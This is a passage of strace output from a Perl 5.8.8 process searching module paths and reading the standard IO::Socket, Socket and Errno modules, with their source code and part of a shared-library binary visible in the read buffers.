${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
5779  07:10:39.124848 stat64("/etc/perl/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124885 stat64("/etc/perl/Socket.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124915 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124928 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124942 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124954 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124968 stat64("/usr/lib/perl5/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124980 stat64("/usr/lib/perl5/Socket.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124993 stat64("/usr/share/perl5/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.125004 stat64("/usr/share/perl5/Socket.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.125017 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.125029 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
5779  07:10:39.125053 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.125068 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.125079 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.125096 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
5779  07:10:39.125543 brk(0x8239000)    = 0x8239000
5779  07:10:39.125741 read(8, "", 4096) = 0
5779  07:10:39.125757 close(8)          = 0
5779  07:10:39.126498 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5779  07:10:39.126525 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5779  07:10:39.126551 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
5779  07:10:39.126565 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
5779  07:10:39.126654 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5779  07:10:39.126672 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d07000
5779  07:10:39.126685 mmap2(0xb7d0c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d0c000
5779  07:10:39.126701 close(8)          = 0
5779  07:10:39.127309 brk(0x825a000)    = 0x825a000
5779  07:10:39.127421 stat64("/etc/perl/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127439 stat64("/etc/perl/Errno.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127453 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127466 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127480 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127492 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127506 stat64("/usr/lib/perl5/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127518 stat64("/usr/lib/perl5/Errno.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127531 stat64("/usr/share/perl5/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127542 stat64("/usr/share/perl5/Errno.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127555 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.127568 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
5779  07:10:39.127588 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.127603 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.127614 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.127633 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
5779  07:10:39.128439 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
5779  07:10:39.136011 _llseek(8, 5966, [5966], SEEK_SET) = 0
5779  07:10:39.136028 _llseek(8, 0, [5966], SEEK_CUR) = 0
5779  07:10:39.136052 close(8)          = 0
5779  07:10:39.136451 brk(0x827b000)    = 0x827b000
5779  07:10:39.136631 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
5779  07:10:39.137141 _llseek(6, 6698, [6698], SEEK_SET) = 0
5779  07:10:39.137159 _llseek(6, 0, [6698], SEEK_CUR) = 0
5779  07:10:39.137170 close(6)          = 0
5779  07:10:39.137203 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137218 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137232 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137245 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137259 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137273 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137287 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137299 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137312 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.137324 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
